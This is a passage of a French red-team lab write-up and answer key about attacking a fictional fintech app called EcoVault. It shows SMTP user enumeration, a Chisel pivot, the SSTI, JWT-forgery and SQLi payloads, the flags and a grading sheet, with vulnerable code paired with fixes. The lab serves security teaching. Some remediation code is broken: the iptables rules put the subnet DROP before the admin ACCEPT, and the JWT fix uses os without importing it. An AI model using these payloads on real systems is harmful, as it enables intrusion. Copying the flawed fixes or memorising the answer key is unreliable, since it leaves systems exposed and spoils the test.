```bash
# VRFY (Verify) : énumération des utilisateurs SMTP
# La commande VRFY vérifie si un utilisateur existe sur le serveur
# << EOF ... EOF : redirige le contenu entre les marqueurs vers nc (entrée standard)
# prochaine commande : envoie VRFY admin -> réponse "252 2.0.0 admin" (existe)
proxychains nc -v 10.0.0.10 25 << EOF
EHLO attacker    # Salutation SMTP
VRFY admin       # Vérifie si 'admin' est un utilisateur valide
VRFY root        # Vérifie si 'root' est un utilisateur valide
VRFY user        # Vérifie si 'user' est un utilisateur valide
QUIT             # Fermeture
EOF
```

**Explication des commandes :**

| Commande/Option | Rôle/Explication |
|----------------|------------------|
| `VRFY` | Commande SMTP qui vérifie si une boîte aux lettres existe sur le serveur (énumération d'utilisateurs) |
| `<< EOF ... EOF` | Here-document : envoie le contenu comme entrée standard de la commande (simule une session) |
| `VRFY admin` | Teste l'existence de l'utilisateur 'admin' — réponse positive (252) → utilisateur existe |
| Attaque | Cette énumération permet à l'attaquant de découvrir les comptes SMTP valides pour des tentatives ultérieures |

**Étape 8 — Récupérer le flag (Flag 5)**

Le flag peut être stocké dans un message SMTP ou accessible via l'interface HTTP interne :

```bash
# Exploration des endpoints HTTP du serveur interne
# /messages : endpoint potentiel listant les messages stockés
proxychains curl http://10.0.0.10:8081/messages
# /emails : endpoint alternatif pour les emails
proxychains curl http://10.0.0.10:8081/emails
# /api/messages : endpoint API REST pour les messages
proxychains curl http://10.0.0.10:8081/api/messages
```

**Explication des commandes :**

| Commande/Option | Rôle/Explication |
|----------------|------------------|
| `proxychains curl` | Curl dont le trafic passe par le tunnel SOCKS5 vers le réseau interne |
| `/messages` | Endpoint HTTP qui liste les messages stockés sur le serveur interne |
| `/emails` | Endpoint alternatif (alias ou endpoint complémentaire) |
| `/api/messages` | Endpoint API REST exposant les messages au format JSON |
| Résultat | Le flag se trouve dans la réponse JSON de l'un de ces endpoints |

**Réponse attendue (Flag 5) :**

```json
{
    "messages": [
        {
            "from": "admin@ecovault.com",
            "to": "support@ecovault.com",
            "subject": "Flag de validation",
            "body": "Le flag est: flag{pivoting_internal_smtp_a1b2c3}"
        }
    ]
}
```

**Flag obtenu :** `flag{pivoting_internal_smtp_a1b2c3}`

#### 4.5.5 Pourquoi ça marche

Le **pivoting** est une étape clé du Red Teaming qui simule un attaquant réel. Une fois le premier serveur compromis (le serveur web frontal), l'attaquant utilise cet accès comme **tremplin** (pivot) pour atteindre des machines qui ne sont pas directement accessibles depuis l'extérieur.

**Chisel** crée un tunnel **SOCKS5** inversé : le serveur compromis se connecte à notre machine attaquante via un canal chiffré, et nous pouvons router notre trafic à travers ce tunnel pour atteindre le réseau interne `10.0.0.0/24`.

**Architecture :**

```
[Attaquant] ── Port 8080 ──→ [Chisel Server]
                                  ↑
                                  │ Tunnel SOCKS5
                                  ↓
                            [Chisel Client] ← Serveur Web (10.0.0.5)
                                  │
                                  │ Scan / Connexion
                                  ↓
                            [Serveur Interne] (10.0.0.10)
                              Port 8081 (HTTP)
                              Port 25   (SMTP)
```

**Proxychains** permet de faire passer les outils (curl, nmap, nc) à travers le tunnel SOCKS5 sans modification.

---

## 5. Template de documentation ATT&CK

### 5.1 Tableau de synthèse des vulnérabilités

| # | Flag | Technique | ATT&CK ID | Tactique | Endpoint | Payload | Impact | Remédiation |
|:-:|------|-----------|-----------|----------|----------|---------|:------:|-------------|
| 1 | `flag{idor_admin_key_7e9f2b}` | IDOR | **T1548** | Privilege Escalation | `GET /api/profile/{id}` | `id=1` | Critique | Vérifier l'appartenance de la ressource |
| 2 | `flag{sqli_extract_users_b4d92f}` | SQL Injection | **T1190** | Initial Access | `GET /api/transactions?filter=` | `' UNION SELECT ...` | Critique | Requêtes paramétrées |
| 3 | `flag{jwt_admin_forge_c3a8e1}` | JWT Auth Bypass | **T1078** | Defense Evasion | JWT header/payload | `alg: none` / confusion / kid | Critique | Refuser alg:none, séparer clés HMAC/RSA |
| 4 | `flag{ssti_rce_shell_f7c3d9}` | SSTI → RCE | **T1190** → **T1059.003** | Execution | `POST /admin/templates` | `{{ cycler.__init__.__globals__.os.popen() }}` | Critique | Ne pas faire confiance aux entrées template |
| 5 | `flag{pivoting_internal_smtp_a1b2c3}` | Pivoting | **T1021** | Lateral Movement | Réseau interne 10.0.0.10 | Chisel tunnel SOCKS5 | Élevé | Segmenter le réseau, firewall interne |

### 5.2 Matrice de couverture ATT&CK (Heat Map textuelle)

```
Tactique                  Technique      Score  Couleur
─────────────────────────────────────────────────────────
TA0004 (PrivEsc)         T1548 (IDOR)     100%  ████████████ Rouge
TA0001 (Initial Access)  T1190 (SQLi)      100%  ████████████ Rouge
TA0005 (Defense Evasion) T1078 (JWT)       100%  ████████████ Rouge
TA0002 (Execution)       T1059.003 (Shell) 100%  ████████████ Rouge
TA0008 (Lat Movement)    T1021 (Pivot)     100%  ████████████ Rouge
TA0007 (Discovery)       T1046 (Scan)       80%  ████████░░░ Orange
TA0011 (C2)              T1572 (Tunnel)     80%  ████████░░░ Orange
─────────────────────────────────────────────────────────
Score de couverture global : 94%
```

### 5.3 Rapport de conformité NIS2

**Entité :** EcoVault SAS  
**Date du test :** 30/05/2026  
**Référentiel :** NIS2 Article 21 — Gestion des risques

| Exigence NIS2 | Couverture ATT&CK | Constat | Conforme |
|---------------|-------------------|---------|:--------:|
| Contrôle d'accès (Art. 21-2c) | T1548 (IDOR) | Aucune vérification d'appartenance | ❌ Non |
| Sécurité applicative (Art. 21-2d) | T1190 (SQLi, SSTI) | Injections multiples | ❌ Non |
| Gestion des identités (Art. 21-2d) | T1078 (JWT) | Signature JWT falsifiable | ❌ Non |
| Segmentation réseau (Art. 21-2g) | T1021 (Pivoting) | Pas de firewall interne | ❌ Non |
| Détection des incidents (Art. 21-2e) | T1046, T1572 | Aucune détection des scans/tunnels | ❌ Non |

### 5.4 Génération de la heat map JSON (ATT&CK Navigator)

```json
{
    "name": "M5 — Scénario Autonome EcoVault",
    "version": "4.1",
    "domain": "mitre-enterprise",
    "description": "Heat map de l'engagement Red Team sur EcoVault — 30/05/2026",
    "techniques": [
        {
            "techniqueID": "T1548",
            "color": "#d62728",
            "score": 100,
            "comment": "IDOR — Flag 1 : Profil admin accessible sans autorisation"
        },
        {
            "techniqueID": "T1190",
            "color": "#d62728",
            "score": 100,
            "comment": "SQLi — Flag 2 : Extraction table users"
        },
        {
            "techniqueID": "T1078",
            "color": "#d62728",
            "score": 100,
            "comment": "JWT Forge — Flag 3 : Token admin forgé"
        },
        {
            "techniqueID": "T1059",
            "sub-techniques": [
                {
                    "techniqueID": "T1059.003",
                    "color": "#d62728",
                    "score": 100,
                    "comment": "SSTI → RCE — Flag 4 : Reverse shell via cycler.__init__.__globals__"
                }
            ],
            "color": "#d62728",
            "score": 100,
            "comment": "RCE via SSTI"
        },
        {
            "techniqueID": "T1021",
            "color": "#f5b042",
            "score": 90,
            "comment": "Pivoting — Flag 5 : Tunnel Chisel vers serveur interne 10.0.0.10"
        },
        {
            "techniqueID": "T1046",
            "color": "#f5b042",
            "score": 80,
            "comment": "Scan réseau interne depuis reverse shell"
        },
        {
            "techniqueID": "T1572",
            "color": "#f5b042",
            "score": 80,
            "comment": "Chisel SOCKS5 tunnel — Protocol Tunneling"
        }
    ],
    "gradient": {
        "colors": ["#98df8a", "#f5b042", "#d62728"],
        "minValue": 0,
        "maxValue": 100
    },
    "legendItems": [
        {"label": "Non testé", "color": "#ececec"},
        {"label": "Partiellement couvert", "color": "#f5b042"},
        {"label": "Exploité avec succès", "color": "#d62728"}
    ],
    "filters": {
        "stages": ["act"],
        "platforms": ["linux"]
    }
}
```

### 5.5 Fiche de notation

| Critère | Barème | Points |
|---------|:------:|:------:|
| Flag 1 — IDOR | 20 pts | ___ / 20 |
| Flag 2 — SQLi | 25 pts | ___ / 25 |
| Flag 3 — JWT Bypass | 25 pts | ___ / 25 |
| Flag 4 — SSTI → RCE | 30 pts | ___ / 30 |
| Flag 5 — Pivoting (bonus) | 20 pts | ___ / 20 |
| Documentation ATT&CK | 10 pts | ___ / 10 |
| **Total** | **130 pts** | **___ / 130** |

**Seuil de réussite :** 60/130 (≈ 46 %)

---

## 6. Annexes : Corrections et explications

### 6.1 Flag 1 — IDOR (T1548)

#### Pourquoi la vulnérabilité existe

```python
# Code vulnérable — app.py:142
@app.route('/api/profile/<int:user_id>')
@jwt_required
def api_profile(user_id):
    current_user_id = get_jwt_identity()  # ← ne JAMAIS utilisé (ligne présente mais ignorée)
    # ⚠️ Aucune comparaison entre user_id et current_user_id : l'ID de l'URL est utilisé sans vérification
    # Tout utilisateur peut consulter le profil de n'importe quel autre utilisateur (IDOR)
    # De plus, la requête SQL est construite par f-string (SQLi potentielle)
    user = query_db(f"SELECT * FROM users WHERE id = {user_id}", one=True)
    return jsonify(user)
```

**Explication du code vulnérable :**

| Élément | Rôle/Explication |
|---------|------------------|
| `@jwt_required` | Décorateur qui vérifie la présence d'un JWT valide (mais pas les droits d'accès) |
| `get_jwt_identity()` | Récupère l'ID de l'utilisateur à partir du JWT — mais cette valeur n'est **jamais utilisée** |
| `user_id` | Provient directement de l'URL (`/api/profile/1` → `user_id=1`) — contrôlé par l'attaquant |
| `f"SELECT * FROM users WHERE id = {user_id}"` | **Double faille** : (1) IDOR car pas de vérification de propriété, (2) SQLi par concaténation directe |
| Risque | Tout utilisateur connecté peut accéder aux données de n'importe quel utilisateur (y compris admin) |

**Cause racine :** L'extraction de l'identité JWT est présente (`get_jwt_identity()`) mais jamais utilisée. Le code récupère l'ID depuis l'URL (`user_id`) et exécute la requête sans vérifier que `user_id == current_user_id`.

**Risque :** Tout utilisateur connecté peut lire le profil de n'importe quel autre utilisateur (y compris l'admin) en modifiant simplement l'ID numérique dans l'URL.

#### Comment corriger

```python
@app.route('/api/profile/<int:user_id>')
@jwt_required
def api_profile(user_id):
    current_user_id = get_jwt_identity()

    # ✅ Vérification d'appartenance : compare l'ID de l'URL avec l'ID du JWT
    if user_id != current_user_id:
        # Exception pour les admins (ils peuvent voir tous les profils)
        current_user = query_db("SELECT role FROM users WHERE id = ?", (current_user_id,), one=True)
        if not current_user or current_user['role'] != 'admin':
            return jsonify({'error': 'Accès non autorisé'}), 403

    # ✅ Requête paramétrée (utilise ? comme placeholder)
    user = query_db("SELECT id, email, role, created_at FROM users WHERE id = ?", (user_id,), one=True)
    if not user:
        return jsonify({'error': 'Utilisateur non trouvé'}), 404

    # ✅ L'api_key n'est exposée que pour l'utilisateur lui-même ou les admins
    if user['id'] == current_user_id or (current_user and current_user['role'] == 'admin'):
        user = query_db("SELECT id, email, role, api_key, created_at FROM users WHERE id = ?", (user_id,), one=True)

    return jsonify(user)
```

**Explication du code corrigé :**

| Élément | Rôle/Explication |
|---------|------------------|
| `current_user_id = get_jwt_identity()` | Récupère l'ID depuis le JWT (source fiable) |
| `if user_id != current_user_id` | Vérifie que l'utilisateur demande son propre profil |
| `current_user['role'] == 'admin'` | Exception pour les administrateurs légitimes |
| `query_db(..., (user_id,), one=True)` | Requête paramétrée avec placeholder `?` → protection SQLi |
| `SELECT ... ` (colonnes listées) | Spécifie explicitement les colonnes à retourner (pas de `*`) |
| Filtre de l'`api_key` | L'api_key n'est transmise que si c'est le profil de l'utilisateur ou un admin |

#### Références

- **OWASP** : [Insecure Direct Object References](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References)
- **PortSwigger** : [IDOR](https://portswigger.net/web-security/access-control/idor)
- **MITRE ATT&CK** : [T1548](https://attack.mitre.org/techniques/T1548/)
- **CWE** : [CWE-639](https://cwe.mitre.org/data/definitions/639.html) — Authorization Bypass Through User-Controlled Key

---

### 6.2 Flag 2 — SQLi (T1190)

#### Pourquoi la vulnérabilité existe

```python
# Code vulnérable — app.py:85
@app.route('/api/transactions')
@jwt_required
def api_transactions():
    filter_val = request.args.get('filter', '')
    # ⚠️ Concaténation directe dans une f-string SQL (f"...{filter_val}...")
    # La valeur du paramètre 'filter' est insérée sans aucun échappement
    # L'attaquant peut injecter : ' UNION SELECT ... -- , ' OR 1=1, SLEEP(3), etc.
    query = f"SELECT id, transaction_ref, montant, devise FROM transactions WHERE id = '{filter_val}'"
    results = query_db(query)
    return jsonify(results)
```

**Explication du code vulnérable :**

| Élément | Rôle/Explication |
|---------|------------------|
| `request.args.get('filter', '')` | Récupère le paramètre GET `filter` sans validation |
| `f"SELECT ... WHERE id = '{filter_val}'"` | **Faille** : la f-string Python insère la valeur brute dans la requête SQL (concaténation) |
| `'{filter_val}'` | Les guillemets simples autour de la valeur permettent de "casser" la chaîne SQL |
| Risque | L'attaquant peut injecter des clauses SQL arbitraires : `UNION SELECT`, `ORDER BY`, `SLEEP()`, etc. |
| Données exposées | Tables `users` (emails, mots de passe), `transactions`, `coupons` |

**Cause racine :** La chaîne SQL est construite par concaténation avec une **f-string Python** (`f"..."`). La valeur du paramètre `filter` est insérée directement sans aucune échappement ni paramétrisation.

**Risque :** L'attaquant peut injecter des clauses SQL arbitraires et extraire toutes les données de la base (tables `users`, `transactions`, `coupons`).

#### Comment corriger

```python
@app.route('/api/transactions')
@jwt_required
def api_transactions():
    filter_val = request.args.get('filter', '')

    # ✅ Requête paramétrée avec placeholder (?) : la valeur est transmise séparément du plan SQL
    # Le SGBD traite filter_val comme une donnée, pas comme du code SQL
    # Même ' OR 1=1 -- est échappé automatiquement
    query = "SELECT id, transaction_ref, montant, devise FROM transactions WHERE id = ?"
    results = query_db(query, (filter_val,))

    return jsonify(results)
```

**Explication du code corrigé :**

| Élément | Rôle/Explication |
|---------|------------------|
| `WHERE id = ?` | Placeholder `?` : le SGBD remplit ce paramètre avec la valeur de manière sécurisée |
| `query_db(query, (filter_val,))` | Les paramètres sont passés séparément de la requête (prévention SQLi) |
| Mécanisme de protection | Le SGBD compile d'abord le plan de requête, puis insère les valeurs — elles ne peuvent pas être interprétées comme du SQL |

**Explication :** Avec les requêtes paramétrées, la valeur `filter_val` est transmise **séparément** du plan de requête. Le SGBD la traite comme une donnée, pas comme du code SQL. Même si la valeur contient `' OR 1=1 --`, elle sera échappée automatiquement.

#### Remédiation avancée

```python
# Solution 1 : ORM (SQLAlchemy) — abstraction de la couche SQL
from flask_sqlalchemy import SQLAlchemy
db = SQLAlchemy()

class Transaction(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    transaction_ref = db.Column(db.String(255))
    montant = db.Column(db.Float)
    devise = db.Column(db.String(10))

@app.route('/api/transactions')
@jwt_required
def api_transactions():
    filter_val = request.args.get('filter', '')
    # L'ORM génère automatiquement des requêtes paramétrées (safe par construction)
    transaction = Transaction.query.filter_by(id=filter_val).first()
    return jsonify(transaction.to_dict() if transaction else [])

# Solution 2 : Validation stricte du type + requête paramétrée
@app.route('/api/transactions')
@jwt_required
def api_transactions():
    try:
        # Force le cast en int : si ce n'est pas un entier, ValueError est levé
        filter_val = int(request.args.get('filter', 0))
    except ValueError:
        return jsonify({'error': 'ID invalide'}), 400
    # Requête paramétrée (safe contre la SQLi même si la validation échouait)
    query = "SELECT * FROM transactions WHERE id = ?"
    results = query_db(query, (filter_val,))
    return jsonify(results)
```

**Explication des solutions avancées :**

| Élément | Rôle/Explication |
|---------|------------------|
| **Solution 1 — ORM** | Les requêtes SQL sont générées par l'ORM avec paramétrisation automatique (SQLAlchemy, Eloquent, etc.) |
| `Transaction.query.filter_by(id=filter_val)` | L'ORM construit une requête paramétrée : le SGBD reçoit la valeur comme paramètre, pas comme du SQL |
| **Solution 2 — Validation stricte** | `int(filter_val)` : si la valeur n'est pas un entier, la requête est refusée avant même d'atteindre la base |
| `int(request.args.get('filter', 0))` | Force le type (cast) + valeur par défaut = protection supplémentaire |
| Principe de défense en profondeur | Combiner validation de type + requêtes paramétrées + moindre privilège BDD |

#### Références

- **OWASP** : [SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- **PortSwigger** : [SQL Injection](https://portswigger.net/web-security/sql-injection)
- **MITRE ATT&CK** : [T1190](https://attack.mitre.org/techniques/T1190/)
- **CWE** : [CWE-89](https://cwe.mitre.org/data/definitions/89.html) — SQL Injection
- **sqlmap** : [https://sqlmap.org](https://sqlmap.org)

---

### 6.3 Flag 3 — Auth Bypass JWT (T1078)

#### Pourquoi la vulnérabilité existe

**Cause racine multiple :**

**1. None Algorithm (T1548) — Accepte l'algorithme 'none' sans vérification :**

```python
# Code vulnérable — app.py:252
header = jwt.get_unverified_header(token)     # Lit le header SANS vérifier la signature (dangereux)
if header.get('alg') == 'none':                # Si l'algorithme est 'none'...
    # ⚠️ NE JAMAIS FAIRE CELA — désactive TOUTE vérification de signature
    return jwt.decode(token, options={"verify_signature": False})
```

**Explication — None Algorithm :**

| Élément | Rôle/Explication |
|---------|------------------|
| `jwt.get_unverified_header(token)` | Récupère le header du JWT sans vérifier la signature (le header est en clair, modifiable par l'attaquant) |
| `header.get('alg') == 'none'` | Vérifie si l'algorithme déclaré est `'none'` (aucune signature) |
| `options={"verify_signature": False}` | **Faille** : désactive la vérification cryptographique — le JWT est accepté sans signature valide |
| Attaque | L'attaquant met `alg: none` dans le header, modifie le payload (ex: `"role": "admin"`) et ne signe pas — le serveur accepte le token |

**2. HMAC/RSA Confusion (T1548) — Utilise la clé publique RSA comme clé HMAC :**

```python
# Code vulnérable — app.py:271
RSA_PUBLIC_KEY = open("public.pem").read()  # La clé publique RSA est accessible (via /api/jwt-info)

def verify_jwt(token):
    header = jwt.get_unverified_header(token)
    if header.get('alg') == 'RS256':
        try:
            return jwt.decode(token, RSA_PUBLIC_KEY, algorithms=['RS256'])
        except:
            # ⚠️ Fallback DANGEREUX : si RS256 échoue, tente HS256 avec la même clé PUBLIQUE
            # Le problème : la clé publique est connue de tous, donc l'attaquant peut signer en HMAC avec elle
            try:
                return jwt.decode(token, RSA_PUBLIC_KEY, algorithms=['HS256'])
            except:
                pass
```

**Explication — HMAC/RSA Confusion :**

| Élément | Rôle/Explication |
|---------|------------------|
| `open("public.pem").read()` | Charge la clé publique RSA (accessible via l'endpoint `/api/jwt-info`) |
| `jwt.decode(token, RSA_PUBLIC_KEY, algorithms=['RS256'])` | Vérification normale avec la clé publique (RS256 = asymétrique) |
| `jwt.decode(token, RSA_PUBLIC_KEY, algorithms=['HS256'])` | **Faille** : tente HS256 (symétrique) avec la **clé publique** comme secret HMAC |
| Attaque | L'attaquant récupère la clé publique via `/api/jwt-info`, puis forge un JWT avec `alg: HS256` signé avec la clé publique — le serveur vérifie avec la même clé publique et accepte le token |

**3. Kid Injection (T1548) — Path traversal dans le paramètre kid :**

```python
# Code vulnérable — app.py:258
kid = header.get('kid', '')             # Le paramètre 'kid' (Key ID) est contrôlé par l'attaquant
if '../' in kid or '/dev/' in kid:       # Détection imparfaite de path traversal
    if 'null' in kid:                    # Si le kid contient 'null'...
        # ⚠️ Utilise une chaîne VIDE comme clé secrète pour vérifier le JWT
        # L'attaquant peut signer son token avec une chaîne vide
        return jwt.decode(token, '', algorithms=['HS256'])
```

**Explication — Kid Injection :**

| Élément | Rôle/Explication |
|---------|------------------|
| `header.get('kid', '')` | Récupère le paramètre `kid` du header (censé indiquer quelle clé utiliser) — contrôlé par l'attaquant |
| `if '../' in kid or '/dev/' in kid` | Filtre imparfait : détecte les tentatives de path traversal mais la logique est défaillante |
| `jwt.decode(token, '', algorithms=['HS256'])` | **Faille** : utilise une chaîne vide comme secret HMAC — l'attaquant peut signer avec une chaîne vide |
| Attaque | L'attaquant met `kid: ...null...` dans le header, signe le token avec une clé vide, et le serveur valide avec une clé vide |

#### Solutions de correction

```python
# Solution complète — verification_jwt.py
# Met en œuvre les bonnes pratiques JWT : liste blanche d'algorithmes, refus de 'none', validation du kid

import jwt
from jwt import PyJWTError

# Clés séparées pour HMAC et RSA (ne JAMAIS utiliser la même clé pour les deux)
HMAC_SECRET = os.environ.get('JWT_HMAC_SECRET', 'une-chaîne-aléatoire-très-longue-128-caractères-minimum')
RSA_PRIVATE_KEY = open("/etc/ssl/jwt_private.pem").read()
RSA_PUBLIC_KEY = open("/etc/ssl/jwt_public.pem").read()

# Liste blanche des algorithmes acceptés (un seul algorithme autorisé)
ALLOWED_ALGORITHMS = ['RS256']

# Liste blanche des kid valides (empêche l'injection de chemin)
ALLOWED_KIDS = ['key1', 'key2', 'key3']

def verify_jwt_secure(token):
    """Vérification sécurisée d'un JWT."""
    try:
        # 1. Récupérer le header SANS faire confiance (mais nécessaire pour connaître l'algo déclaré)
        header = jwt.get_unverified_header(token)
        alg = header.get('alg', '')

        # 2. Refuser 'none' explicitement (avant toute autre vérification)
        if alg == 'none':
            raise jwt.InvalidAlgorithmError("Algorithme 'none' refusé")

        # 3. Vérifier que l'algorithme est dans la liste blanche
        if alg not in ALLOWED_ALGORITHMS:
            raise jwt.InvalidAlgorithmError(f"Algorithme {alg} non autorisé")

        # 4. Vérifier le kid (si présent) contre une liste blanche — pas de path traversal possible
        kid = header.get('kid', '')
        if kid and kid not in ALLOWED_KIDS:
            raise jwt.InvalidTokenError(f"kid {kid} non reconnu")

        # 5. Vérifier la signature avec la clé appropriée (un seul chemin possible)
        if alg == 'RS256':
            return jwt.decode(token, RSA_PUBLIC_KEY, algorithms=['RS256'])

    except PyJWTError as e:
        raise jwt.InvalidTokenError(f"Token invalide : {e}")

    return None
```

**Explication du code corrigé :**

| Élément | Rôle/Explication |
|---------|------------------|
| `ALLOWED_ALGORITHMS = ['RS256']` | Liste blanche : un seul algorithme accepté, tout autre (dont `none` et `HS256`) est rejeté |
| `if alg == 'none'` | Refus explicite de l'algorithme `none` (protection en profondeur) |
| `ALLOWED_KIDS = ['key1', 'key2', 'key3']` | Liste blanche des `kid` valides : empêche l'injection de chemins arbitraires |
| `jwt.decode(token, RSA_PUBLIC_KEY, algorithms=['RS256'])` | Décodage avec clé RSA publique et algorithme RS256 uniquement |
| `HMAC_SECRET` et `RSA_PRIVATE_KEY` | Clés séparées pour les différents usages (pas de confusion possible) |
| Principe de défense en profondeur | Combinaison de (1) liste blanche d'algos, (2) validation du kid, (3) refus de 'none', (4) clés séparées |
| `PyJWTError` | Capture toutes les erreurs JWT (signature invalide, token expiré, etc.) en une seule exception |

#### Références

- **JWT.io** : [https://jwt.io](https://jwt.io)
- **PortSwigger** : [JWT attacks](https://portswigger.net/web-security/jwt)
- **MITRE ATT&CK** : [T1078](https://attack.mitre.org/techniques/T1078/)
- **CWE** : [CWE-347](https://cwe.mitre.org/data/definitions/347.html) — Improper Verification of Cryptographic Signature
- **jwt_tool** : [https://github.com/ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool)

---

### 6.4 Flag 4 — SSTI → RCE (T1190 → T1059.003)

#### Pourquoi la vulnérabilité existe

```python
# Code vulnérable — app.py:312
from flask import render_template_string

@app.route('/admin/templates', methods=['POST'])
@jwt_required
@admin_required
def admin_templates():
    template = request.form.get('template', '')

    # ⚠️ render_template_string interprète la chaîne comme un template Jinja2 complet
    # L'attaquant peut injecter : {{ cycler.__init__.__globals__.os.popen('cmd').read() }}
    # Le moteur Jinja2 exécute le code Python arbitraire sans aucune restriction
    rendered = render_template_string(template)
    return rendered
```

**Explication du code vulnérable :**

| Élément | Rôle/Explication |
|---------|------------------|
| `render_template_string(template)` | **Faille** : interprète la chaîne utilisateur comme un template Jinja2 — exécution de code arbitraire |
| `request.form.get('template', '')` | Récupère le template depuis la requête POST sans filtrage |
| `{{ }}` | Délimiteurs Jinja2 : tout ce qui se trouve entre eux est exécuté par le moteur de template |
| Accès aux globals | `cycler.__init__.__globals__.os.popen()` : chaîne d'accès aux objets Python internes |
| Impact | Exécution de commandes système (RCE), exfiltration de données, reverse shell |

**Cause racine :** `render_template_string()` prend une chaîne et l'interprète comme un template Jinja2 complet. Si l'utilisateur contrôle cette chaîne, il peut injecter des expressions `{{ }}` qui accèdent aux objets Python internes (`__class__`, `__mro__`, `__subclasses__`, `__globals__`).

**Chaîne d'exploitation :**

```
{{ cycler.__init__.__globals__.os.popen('commande').read() }}
    │        │         │         │         │          │
    │        │         │         │         │          └── lit la sortie
    │        │         │         │         └── exécute la commande
    │        │         │         └── module os (système)
    │        │         └── dictionnaire des globals
    │        └── constructeur de l'objet
    └── objet Jinja2 global (toujours disponible)
```

#### Comment corriger

```python
# Solution 1 : NE PAS utiliser render_template_string avec une entrée utilisateur
@app.route('/admin/templates', methods=['POST'])
@jwt_required
@admin_required
def admin_templates():
    template_name = request.form.get('template', 'default.html')
    data = request.form.get('data', '')

    # ✅ Utiliser un template fixe (fichier .html) et passer les données comme variables
    # La saisie utilisateur est disponible via {{ user_data }} dans le fichier template
    # render_template() charge le fichier — la variable data n'est jamais interprétée comme du code
    return render_template(
        f"admin/{template_name}.html",
        user_data=data
    )
```

**Explication — Solution 1 :**

| Élément | Rôle/Explication |
|---------|------------------|
| `render_template("admin/{name}.html", user_data=data)` | Charge un fichier template fixe ; `data` est passé comme **variable** et non comme **code** |
| `{{ user_data }}` | Dans le fichier template, cette syntaxe affiche la valeur sans l'interpréter comme du code |
| Principe | Séparation stricte entre le code du template (fichier) et les données utilisateur (variables) |
| Attention | `template_name` doit être validé (éviter le path traversal : `../../../etc/passwd`) |

```python
# Solution 2 : Sandbox Jinja2 — environnement restreint
from jinja2.sandbox import SandboxedEnvironment

env = SandboxedEnvironment()
# Le SandboxedEnvironment bloque automatiquement l'accès aux objets dangereux :
#   - __class__, __base__, __subclasses__ (remontée de classes)
#   - __globals__, __builtins__ (accès aux modules Python)
#   - os, subprocess, eval, exec (exécution de code)

template = env.from_string(user_input)
result = template.render()
```

**Explication — Solution 2 (Sandbox) :**

| Élément | Rôle/Explication |
|---------|------------------|
| `SandboxedEnvironment()` | Environnement Jinja2 sécurisé qui bloque les attributs dangereux (`__class__`, `__globals__`, etc.) |
| `env.from_string(user_input)` | Crée un template à partir de la chaîne utilisateur DANS le sandbox |
| Limitation | Un sandbox n'est pas infaillible — des failles de sandbox escaping existent (CVE historiques) |
| Recommandation | Utiliser le sandbox EN PLUS d'un template fixe, pas comme seule protection |

```python
# Solution 3 : Validation stricte avec liste blanche (caractères autorisés)
import re

# Regex qui n'autorise que les caractères "sûrs" (lettres, chiffres, espaces, ponctuation simple)
ALLOWED_PATTERN = re.compile(r'^[\w\s\.\,\;\:\!\?\%\€\-\(\)\[\]]+$')

@app.route('/admin/templates', methods=['POST'])
@jwt_required
@admin_required
def admin_templates():
    template = request.form.get('template', '')

    # ✅ Rejeter tout ce qui ressemble à une expression Jinja2 (délimiteurs)
    if '{{' in template or '{%' in template:
        return jsonify({'error': 'Syntaxe template non autorisée'}), 400

    # ✅ Validation stricte du contenu via la regex (whitelist)
    if not ALLOWED_PATTERN.match(template):
        return jsonify({'error': 'Caractères non autorisés'}), 400

    # ✅ Utilisation d'un template fixe (pas de render_template_string)
    return render_template("preview.html", content=template)
```

**Explication — Solution 3 (Validation) :**

| Élément | Rôle/Explication |
|---------|------------------|
| `r'^[\w\s\.\,\;\:\!\?\%\€\-\(\)\[\]]+$'` | Regex en liste blanche : seuls ces caractères sont autorisés (pas de `{}`, `<>`, `_` pour les accès Python) |
| `if '{{' in template or '{%' in template` | Rejette les délimiteurs Jinja2 `{{ }}` (expression) et `{% %}` (bloc) |
| `render_template("preview.html", content=template)` | Template fixe avec la saisie comme variable (safe par conception) |
| Principe de défense en profondeur | Combinaison de (1) détection de syntaxe, (2) regex whitelist, (3) template fixe — 3 couches de sécurité |
| Limitation | La regex peut être trop restrictive pour certains cas d'usage légitimes |

#### Références

- **OWASP** : [Server-Side Template Injection](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server-side_Template_Injection)
- **PortSwigger** : [SSTI](https://portswigger.net/web-security/server-side-template-injection)
- **PayloadsAllTheThings** : [Jinja2 SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2)
- **MITRE ATT&CK** : [T1059.003](https://attack.mitre.org/techniques/T1059/003/)
- **CWE** : [CWE-94](https://cwe.mitre.org/data/definitions/94.html) — Improper Control of Generation of Code (Code Injection)

---

### 6.5 Flag 5 — Pivoting (T1021)

#### Pourquoi la vulnérabilité existe

**Causes racines :**

1. **Absence de segmentation réseau :** Le serveur web (`10.0.0.5`) peut communiquer librement avec le serveur interne (`10.0.0.10`) sans restriction.
2. **Services internes exposés :** Les ports 8081 (HTTP) et 25 (SMTP) sont accessibles depuis n'importe quelle machine du réseau `10.0.0.0/24`.
3. **Pas de firewall interne :** Aucune règle `iptables` ne limite le trafic entre les zones (DMZ → interne).
4. **Absence de détection :** Aucun IDS/IPS ne détecte les connexions inhabituelles (scans, tunnels).

#### Comment corriger

```bash
# Solution 1 : Firewall interne (iptables) sur le serveur interne (10.0.0.10)
# Bloquer TOUT le trafic entrant vers le port 8081 depuis le sous-réseau 10.0.0.0/24
iptables -A INPUT -s 10.0.0.0/24 -p tcp --dport 8081 -j DROP
# Autoriser UNIQUEMENT l'adresse IP de l'administrateur (10.0.0.100)
iptables -A INPUT -s 10.0.0.100 -p tcp --dport 8081 -j ACCEPT

# Solution 2 : Firewall sur le serveur web compromis (10.0.0.5)
# Bloquer les connexions SORTANTES depuis le serveur web vers le serveur interne
# Empêche le pivoting : même si le serveur web est compromis, il ne peut pas atteindre le serveur interne
iptables -A OUTPUT -d 10.0.0.10 -p tcp --dport 8081 -j DROP  # Bloque HTTP interne
iptables -A OUTPUT -d 10.0.0.10 -p tcp --dport 25 -j DROP     # Bloque SMTP interne
```

**Explication des règles iptables :**

| Règle iptables | Rôle/Explication |
|----------------|------------------|
